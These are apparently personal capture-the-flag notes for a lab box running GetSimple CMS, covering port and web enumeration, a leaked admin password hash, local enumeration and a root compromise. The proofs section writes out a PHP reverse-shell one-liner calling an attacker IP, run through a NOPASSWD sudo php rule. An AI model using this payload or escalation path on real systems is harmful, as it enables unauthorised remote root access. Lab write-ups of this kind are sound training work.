# BOX NAME: Knowledge Check _ nibbler
**LINK**: 

<details open><summary><ins>SUMMARY</ins></summary>

```
1. 
2. 
3. 
4. 
5.

```
</details>

# REMOTE ENUMERATION:

<details><summary><ins>TARGET</ins></summary>

```
[+] IP:		10.129.42.249
[+] URL:	http://gettingstarted.htb
```
</details>
<details><summary><ins>NMAP</ins></summary>

```
└─$ jml-scanner -u 10.129.42.249 -p 65535        

+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|J|M|L|-|P|O|R|T|S|C|A|N|N|E|R|
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

[+] Port 22 is open.
[+] Port 80 is open.

[+] A total of 2 found ports open  

____

└─$ nmap -sV -sC 10.129.42.249 -oN nmap-knowledge.log     
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-11 14:10 CEST
Nmap scan report for 10.129.42.249
Host is up (0.042s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4c73a025f5fe817b822b3649a54dc85e (RSA)
|   256 e1c056d052042f3cac9ae7b1792bbb13 (ECDSA)
|_  256 523147140dc38e1573e3c424a23a1277 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Welcome to GetSimple! - gettingstarted
| http-robots.txt: 1 disallowed entry 
|_/admin/
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.97 seconds

```
</details>
<details><summary><ins>WEB</ins></summary>

whatweb-scan
```
http://10.129.42.249 [200 OK] AddThis, Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.42.249], Script[text/javascript], Title[Welcome to GetSimple! - gettingstarted]
```

nikto-scan
```
└─$ nikto -h 10.129.42.249 | tee nikto-knowledge.log
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.129.42.249
+ Target Hostname:    10.129.42.249
+ Target Port:        80
+ Start Time:         2023-06-11 15:03:31 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /robots.txt: Entry '/admin/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: contains 1 entry which should be manually viewed. See: https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt
+ Apache/2.4.41 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /sitemap.xml: This gives a nice listing of the site content.                                                                      
+ /admin/: This might be interesting.                                                                                                                     
+ /data/: Directory indexing found.                                                                                                                       
+ /data/: This might be interesting.                                                                                                                      
+ /readme.txt: This might be interesting.                                                                                                                 
+ /admin/index.php: This might be interesting: has been seen in web logs from an unknown scanner.                                                                                        
+ /LICENSE.txt: License file found may identify site software.                                                                                                                           
+ 8103 requests: 0 error(s) and 13 item(s) reported on remote host                                                                                                                                                                                                                                                                                                                                                                                                              
+ End Time:           2023-06-11 15:11:00 (GMT2) (449 seconds)                                                                                                                                                                                                                                                                                                                                                                                                                  
-------------------------
```

fuzzing
```
data                    [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 40ms]
admin                   [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 40ms]
plugins                 [Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 40ms]
theme                   [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 49ms]
backups                 [Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 43ms]
server-status           [Status: 403, Size: 283, Words: 20, Lines: 10, Duration: 47ms]

http://gettingstarted.htb/data/users/admin.xml
<item>
	<USR>admin</USR>
	<NAME/>
	<PWD>d033e22ae348aeb5660fc2140aec35850c4da997</PWD>
	<EMAIL>admin@gettingstarted.com</EMAIL>
	<HTMLEDITOR>1</HTMLEDITOR>
	<TIMEZONE/>
	<LANG>en_US</LANG>
</item>

```
other
```

```

</details>

<details><summary><ins>SERVICES</ins></summary>

FTP
```

```

SSH
```

```

SNMP
```

```

DNS
```

```

MAILSERVICES (POP, IMAP, SMTP)
```

```

LDAP
```

```

</details>

<details><summary><ins>Active Directory</ins></summary>

Active Directory
```

```
</details>

<details><summary><ins>SUMMARY REMOTE</ins></summary>

```
1. Enumerate the GetSimple CMS.
2. Either get a shell via metasploit getsimplecms module or manipulate a .php file in themes. the upload functions seems to be tampered with.
```
</details>

# LOCAL ENUMERATION:

<details><summary><ins>FILES OF INTEREST</ins></summary>

**FILES**:
```
$ sudo -l
Matching Defaults entries for www-data on gettingstarted:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on gettingstarted:
    (ALL : ALL) NOPASSWD: /usr/bin/php

```

**SUID's**:

```
www-data@gettingstarted:/var/www/html/admin$ find / -perm -u=s -type f 2>/dev/null
/snap/snapd/11036/usr/lib/snapd/snap-confine                                                    
/snap/snapd/11588/usr/lib/snapd/snap-confine                                                                    
/snap/core18/1997/bin/mount                                                                                     
/snap/core18/1997/bin/ping                                                                                      
/snap/core18/1997/bin/su                                                                                        
/snap/core18/1997/bin/umount                                                                                    
/snap/core18/1997/usr/bin/chfn                                                                                                         
/snap/core18/1997/usr/bin/chsh                                                                                                         
/snap/core18/1997/usr/bin/gpasswd
/snap/core18/1997/usr/bin/newgrp
/snap/core18/1997/usr/bin/passwd
/snap/core18/1997/usr/bin/sudo
/snap/core18/1997/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/1997/usr/lib/openssh/ssh-keysign
/snap/core18/1988/bin/mount
/snap/core18/1988/bin/ping
/snap/core18/1988/bin/su
/snap/core18/1988/bin/umount
/snap/core18/1988/usr/bin/chfn
/snap/core18/1988/usr/bin/chsh
/snap/core18/1988/usr/bin/gpasswd
/snap/core18/1988/usr/bin/newgrp
/snap/core18/1988/usr/bin/passwd
/snap/core18/1988/usr/bin/sudo
/snap/core18/1988/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/1988/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/chsh
/usr/bin/su
/usr/bin/chfn
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/umount
/usr/bin/fusermount
/usr/bin/at
/usr/bin/newgrp

```
**SGID's**:
find / -type f -user mrb3n 2>/dev/null
```
www-data@gettingstarted:/var/www/html/admin$ find / -perm -g=s -type f 2>/dev/null
/snap/core18/1997/sbin/pam_extrausers_chkpwd
/snap/core18/1997/sbin/unix_chkpwd
/snap/core18/1997/usr/bin/chage
/snap/core18/1997/usr/bin/expiry
/snap/core18/1997/usr/bin/ssh-agent
/snap/core18/1997/usr/bin/wall
/snap/core18/1988/sbin/pam_extrausers_chkpwd
/snap/core18/1988/sbin/unix_chkpwd
/snap/core18/1988/usr/bin/chage
/snap/core18/1988/usr/bin/expiry
/snap/core18/1988/usr/bin/ssh-agent
/snap/core18/1988/usr/bin/wall
/usr/lib/x86_64-linux-gnu/utempter/utempter
/usr/sbin/pam_extrausers_chkpwd
/usr/sbin/unix_chkpwd
/usr/bin/ssh-agent
/usr/bin/crontab
/usr/bin/chage
/usr/bin/expiry
/usr/bin/wall
/usr/bin/at
/usr/bin/bsd-write

```
**OTHERS**:

```
mrb3n:x:1000:1000:mrb3n:/home/mrb3n:/bin/bash
```
</details>


# LOOT

<details><summary><ins>USEFUL INFORMATION:</ins></summary>

**Kernel Info:**
*file /bin/bash ; echo -e " \\n" && lsb_release -a ; echo -e "\\n" && uname -a*
```
meterpreter > sysinfo
Computer    : gettingstarted
OS          : Linux gettingstarted 5.4.0-65-generic #73-Ubuntu SMP Mon Jan 18 17:25:17 UTC 2021 x86_64
Meterpreter : php/linux

```
</details>

<details><summary><ins>CREDS:</ins></summary>

```
username:password

admin:d033e22ae348aeb5660fc2140aec35850c4da997
admin:admin
```
</details>

<details><summary><ins>HASHES:</ins></summary>

```

```
</details>

# PROOFS

<details><summary><ins>Proofs</ins></summary>

Final payload:
```
╔══════════╣ CVEs Check
Vulnerable to CVE-2021-4034                                                                                                                                                                  
Vulnerable to CVE-2021-3560
```

```
create a file "/tmp/rev.php" and enter:
<?php $sock=fsockopen("10.10.14.158",5555);$proc=proc_open("/bin/sh -i", array(0=>$sock,1=>$sock,2=>$sock),$pipes); ?>
```

```
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ cat /tmp/rev.php
<?php $sock=fsockopen("10.10.14.158",5555);$proc=proc_open("/bin/sh -i", array(0=>$sock,1=>$sock,2=>$sock),$pipes); ?>
$ sudo /usr/bin/php -f rev.php

-->> 

└─$ nc -lnvp 5555
listening on [any] 5555 ...
connect to [10.10.14.158] from (UNKNOWN) [10.129.42.249] 33822
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
# 
```

</details>